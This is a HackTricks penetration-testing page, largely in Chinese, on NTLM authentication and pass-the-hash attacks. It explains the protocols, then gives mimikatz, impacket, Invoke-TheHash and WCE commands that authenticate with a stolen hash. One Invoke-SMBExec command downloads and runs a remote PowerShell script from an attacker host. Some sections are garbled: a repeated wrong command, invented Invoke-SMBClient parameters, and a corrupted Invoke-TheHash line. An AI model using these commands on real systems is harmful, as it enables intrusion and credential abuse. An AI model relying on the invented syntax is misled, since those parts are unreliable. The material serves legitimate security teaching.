# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 基本信息

**NTLM凭证**：域名（如果有），用户名和密码哈希值。

**LM**仅在**Windows XP和Server 2003**中启用（可以破解LM哈希）。LM哈希值AAD3B435B51404EEAAD3B435B51404EE表示未使用LM（是空字符串的LM哈希值）。

默认情况下，使用**Kerberos**，因此只有在**没有配置Active Directory**、**域不存在**、**Kerberos不工作**（配置错误）或**客户端**使用IP而不是有效的主机名进行连接时，才会使用NTLM。

NTLM身份验证的**网络数据包**具有标题“**NTLMSSP**”。

协议：LM、NTLMv1和NTLMv2在DLL %windir%\Windows\System32\msv1\_0.dll中受支持。

## LM、NTLMv1和NTLMv2

您可以检查和配置要使用的协议：

### 图形界面

执行_secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全：LAN Manager身份验证级别。有6个级别（从0到5）。

![](<../../.gitbook/assets/image (92).png>)

### 注册表

这将设置级别5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本的NTLM域身份验证方案

1. 用户输入他的凭据
2. 客户端机器发送身份验证请求，发送域名和用户名
3. 服务器发送挑战
4. 客户端使用密码的哈希作为密钥对挑战进行加密，并将其作为响应发送
5. 服务器将域名、用户名、挑战和响应发送给域控制器。如果没有配置活动目录或域名是服务器的名称，则在本地检查凭据。
6. 域控制器检查一切是否正确，并将信息发送给服务器

服务器和域控制器能够通过Netlogon服务器创建安全通道，因为域控制器知道服务器的密码（它在NTDS.DIT数据库中）。

### 本地NTLM身份验证方案

身份验证与之前提到的相同，但服务器知道尝试在SAM文件中进行身份验证的用户的哈希。因此，服务器将自行检查用户是否可以进行身份验证。

### NTLMv1挑战

挑战长度为8字节，响应长度为24字节。

哈希NT（16字节）分为3个部分，每个部分为7字节（7B + 7B +（2B + 0x00 * 5））：最后一部分填充为零。然后，挑战分别与每个部分进行加密，然后将结果加密字节连接起来。总计：8B + 8B + 8B = 24字节。

问题：

- 缺乏随机性
- 可以分别攻击3个部分以找到NT哈希
- DES是可破解的
- 第三个密钥始终由5个零组成。
- 给定相同的挑战，响应将是相同的。因此，您可以将字符串“1122334455667788”作为挑战提供给受害者，并使用预先计算的彩虹表攻击响应。

### NTLMv1攻击

现在越来越少见的是找到配置了无限制委派的环境，但这并不意味着您不能滥用配置了打印池服务的凭据/会话。

您可以滥用您已经在AD上拥有的一些凭据/会话，要求打印机对某个您控制的主机进行身份验证。然后，使用`metasploit auxiliary/server/capture/smb`或`responder`，您可以将身份验证挑战设置为1122334455667788，捕获身份验证尝试，如果使用NTLMv1进行身份验证，则可以破解它。\
如果您使用的是`responder`，您可以尝试使用`--lm`标志尝试降级身份验证。\
请注意，对于此技术，身份验证必须使用NTLMv1执行（NTLMv2无效）。

请记住，打印机在身份验证期间将使用计算机帐户，并且计算机帐户使用长且随机的密码，您可能无法使用常见的字典破解它。但是，NTLMv1身份验证使用DES（更多信息请参见[此处](./#ntlmv1-challenge)），因此使用专门用于破解DES的一些服务，您将能够破解它（例如，您可以使用[https://crack.sh/](https://crack.sh)）。

### NTLMv2挑战

挑战长度为8字节，发送2个响应：一个长度为24字节，另一个长度可变。

第一个响应是通过使用HMAC_MD5对由客户端和域组成的字符串进行加密，并使用NT哈希的哈希MD4作为密钥来创建的。然后，将结果用作密钥，使用HMAC_MD5对挑战进行加密。为此，将添加一个8字节的客户端挑战。总计：24 B。

第二个响应是使用多个值创建的（新的客户端挑战、时间戳以避免重放攻击等）。

如果您有捕获成功身份验证过程的pcap文件，您可以按照此指南获取域名、用户名、挑战和响应，并尝试破解密码：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## 传递哈希

一旦您获得了受害者的哈希，您可以使用它来冒充受害者。\
您需要使用一个工具，该工具将使用该哈希执行NTLM身份验证，或者您可以创建一个新的会话登录并将该哈希注入LSASS，因此当执行任何NTLM身份验证时，将使用该哈希。最后一种选项是mimikatz所做的。

请记住，您也可以使用计算机帐户执行传递哈希攻击。

### Mimikatz

需要以管理员身份运行
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程将属于启动mimikatz的用户，但在LSASS内部，保存的凭据是mimikatz参数中的凭据。然后，您可以访问网络资源，就好像您是该用户（类似于“runas /netonly”技巧，但您不需要知道明文密码）。

### 从Linux使用Pass-the-Hash

您可以使用Linux从Windows机器上获得Pass-the-Hash的代码执行。\
[**点击此处了解如何操作。**](../../windows/ntlm/broken-reference/)

### Impacket Windows编译工具

您可以在此处下载Windows的impacket二进制文件：[https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（在这种情况下，您需要指定一个命令，cmd.exe和powershell.exe无法获得交互式shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 还有其他几个Impacket二进制文件...

### Invoke-TheHash

您可以从这里获取PowerShell脚本：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec是一种用于在Windows系统上执行远程命令的工具。它利用Windows Management Instrumentation (WMI)服务来执行命令，从而绕过防火墙和安全限制。该工具可以在目标系统上执行命令并返回结果，而无需在目标系统上安装任何软件。

##### 用法

```
Invoke-WMIExec -Target <Target> -Username <Username> -Password <Password> -Command <Command>
```

- `<Target>`: 目标系统的IP地址或主机名。
- `<Username>`: 用于身份验证的用户名。
- `<Password>`: 用于身份验证的密码。
- `<Command>`: 要在目标系统上执行的命令。

##### 示例

```
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig"
```

该命令将在目标系统上执行`ipconfig`命令，并将结果返回给攻击者。

##### 注意事项

- 在使用Invoke-WMIExec之前，请确保已获得合法的访问权限。
- 请谨慎使用该工具，以避免违反法律法规。
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

The `Invoke-SMBClient` command is a PowerShell script that allows you to interact with the Server Message Block (SMB) protocol. This protocol is commonly used for file and printer sharing in Windows networks.

With `Invoke-SMBClient`, you can perform various actions such as connecting to SMB shares, listing files and directories, uploading and downloading files, and executing commands on remote systems.

To use `Invoke-SMBClient`, you need to provide the target IP address or hostname, the username and password for authentication, and the desired action. The script supports both NTLM and Kerberos authentication methods.

Here are some examples of how to use `Invoke-SMBClient`:

- Connect to an SMB share:
```
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Action Connect
```

- List files and directories in an SMB share:
```
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Action List
```

- Upload a file to an SMB share:
```
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Action Upload -LocalFile C:\file.txt -RemotePath \\share\file.txt
```

- Download a file from an SMB share:
```
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Action Download -RemotePath \\share\file.txt -LocalFile C:\file.txt
```

- Execute a command on a remote system:
```
Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Action Execute -Command "whoami"
```

Note that `Invoke-SMBClient` requires administrative privileges on the target system in order to perform certain actions, such as executing commands.

Keep in mind that using this script for unauthorized purposes is illegal and unethical. Always ensure you have proper authorization before performing any actions on remote systems.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Invoke-SMBEnum是一个用于枚举SMB协议的PowerShell脚本。它可以帮助你发现目标系统上的共享文件夹、用户和组信息，以及其他与SMB相关的配置。

##### 用法

```powershell
Invoke-SMBEnum -Target <TargetIP> [-Port <Port>] [-Credential <Credential>] [-Verbose]
```

- `Target`：目标系统的IP地址。
- `Port`：可选参数，指定SMB协议的端口号，默认为445。
- `Credential`：可选参数，指定用于身份验证的凭据。
- `Verbose`：可选参数，显示详细的输出信息。

##### 示例

```powershell
Invoke-SMBEnum -Target 192.168.1.10 -Port 445 -Credential (Get-Credential)
```

此示例将枚举IP地址为192.168.1.10的目标系统上的SMB共享信息，并使用凭据进行身份验证。

##### 注意事项

- 在使用此脚本之前，请确保已经获取了合法的授权，并且仅在授权范围内使用。
- 请谨慎处理枚举到的敏感信息，避免泄露给未经授权的人员。
- 请遵守法律法规，不要将此脚本用于非法活动。
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

这个函数是其他所有函数的混合体。你可以传递多个主机，排除某些主机，并选择你想要使用的选项（SMBExec、WMIExec、SMBClient、SMBEnum）。如果你选择了SMBExec和WMIExec中的任何一个，但没有提供Command参数，它只会检查你是否有足够的权限。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM 传递哈希](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows凭证编辑器（WCE）

**需要以管理员身份运行**

此工具将执行与mimikatz相同的操作（修改LSASS内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码手动执行Windows远程操作

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## 从Windows主机中提取凭据

**有关如何从Windows主机中获取凭据的更多信息，请阅读此页面** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**

## NTLM中继和Responder

**详细了解如何执行这些攻击的指南，请阅读此处：**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## 从网络捕获中解析NTLM挑战

**您可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
